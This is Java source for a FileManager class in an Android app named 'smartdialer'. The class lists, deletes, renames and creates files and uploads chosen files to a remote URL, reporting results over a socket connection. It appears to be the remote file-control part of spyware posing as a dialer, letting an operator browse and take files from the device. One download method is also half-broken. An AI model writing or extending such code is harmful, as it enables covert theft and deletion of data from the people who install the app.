package com.example.smartdialer;

import android.util.Log;

import com.example.smartdialer.client.APIinterface;
import com.example.smartdialer.client.RetrofitClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;


public class FileManager {
    public static JSONArray walk(String path){
        JSONArray values = new JSONArray();
        File dir = new File(path);
        if (!dir.canRead()) {
            try {
                JSONObject errorJson = new JSONObject();
                errorJson.put("type", "error");
                errorJson.put("error", "Denied");
                values.put(errorJson);
                return values;
                //SocketConn.getInstance().getSocket().emit("dir" , errorJson);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }

        File[] list = dir.listFiles();
        try {
        if (list != null) {
            JSONObject parenttObj = new JSONObject();
            parenttObj.put("name", "../");
            parenttObj.put("isDir", true);
            parenttObj.put("path", dir.getParent());
            values.put(parenttObj);
            for (File file : list) {
                if (!file.getName().startsWith(".")) {
                    JSONObject fileObj = new JSONObject();
                    fileObj.put("name", file.getName());
                    fileObj.put("isDir", file.isDirectory());
                    fileObj.put("size", file.length());
                    fileObj.put("path", file.getAbsolutePath());
                    values.put(fileObj);
                }
            }
        }
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return values;
    }

    public static boolean deleteFile(String path){
        if (path == null)
            return false;

        File file = new File(path);
        if (file.exists()){
            return file.delete();
        }else {
            return false;
        }

    }

    public static boolean renameFile(String path, String fileName){
        if (path == null)
            return false;

        File file = new File(path);
        File newFile = new File(fileName);
        if (file.exists()){
            return file.renameTo(newFile);
        }else {
            return false;
        }
    }

    public static boolean createFolder(String path){
        if (path == null)
            return false;

        File file = new File(path);
        return file.mkdir();
    }

    public static void downloadFile(String url, String path){
        if (path == null)
            return;

        File file = new File(path);

        if (file.exists()){
            Log.e("TAG", "file exist: " );
            int size = (int) file.length();
            byte[] data = new byte[size];
            try {
                Log.e("TAG", "trying " );
                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
                buf.read(data, 0, data.length);
                JSONObject object = new JSONObject();
                object.put("type","download");
                object.put("name",file.getName());
                object.put("buffer" , data);
                SocketConn.getInstance().getSocket().emit("download" , "Can Not");
                buf.close();
            } catch (Exception e) {
                e.printStackTrace();
            }

        }
    }

    public static void uploadToServer(String url, String path) {
        if (path == null)
            return;
        try {
            File file = new File(path);
            if (file.exists()) {
                RequestBody requestFile = RequestBody.create(MediaType.parse("multipart/form-data"), file);
                MultipartBody.Part multipartBody = MultipartBody.Part.createFormData("file", file.getName(), requestFile);

                RetrofitClient.getRetrofitInstance().create(APIinterface.class).upload(url, multipartBody).enqueue(new Callback<ResponseBody>() {
                    @Override
                    public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                        String res = null;
                        try {
                            res = response.body().string();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        SocketConn.getInstance().getSocket().emit("download", res);
                    }

                    @Override
                    public void onFailure(Call<ResponseBody> call, Throwable t) {
                        SocketConn.getInstance().getSocket().emit("download", "{\"status\":false}");
                    }
                });
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

}
